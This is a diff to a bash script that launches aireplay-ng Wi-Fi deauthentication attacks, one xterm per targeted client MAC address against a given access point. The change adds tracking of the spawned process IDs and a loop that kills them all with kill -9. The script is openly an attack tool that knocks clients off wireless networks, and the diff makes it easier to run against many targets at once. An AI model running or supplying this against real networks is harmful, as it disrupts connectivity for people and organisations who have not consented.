@@ -130,11 +130,19 @@ tr '[:upper:]' '[:lower:]' < $ID$tempDir/$targets.txt > $ID$tempDir/$targetsLowe
 tr '[:upper:]' '[:lower:]' < $ID$tempDir/$apMac.txt > $ID$tempDir/$apMacLower.txt
 apMac=`cat $ID$tempDir/$apMacLower.txt`
 
+# Create temp PID file in temp folder
+touch $ID$tempDir/pids.txt
+
 # Start  aireplay-ng -0 1 -a Access point mac -c client mac interface
 # each client gets their own terminal window
 #echo $int
 cat $ID$tempDir/$targetsLower.txt | while read line; do
 	xterm -geometry 90x20${X[i]}${Y[i]} -hold -e sudo aireplay-ng -0 $deauths -a $apMac -c $line $int &
 	i=$((i+1))
+	echo $! >> $ID$tempDir/pids.txt
 done
-
+echo "ctl + c to kill all processes"
+read kill
+cat pids.txt | while read line; do
+	kill -9 $line
+done
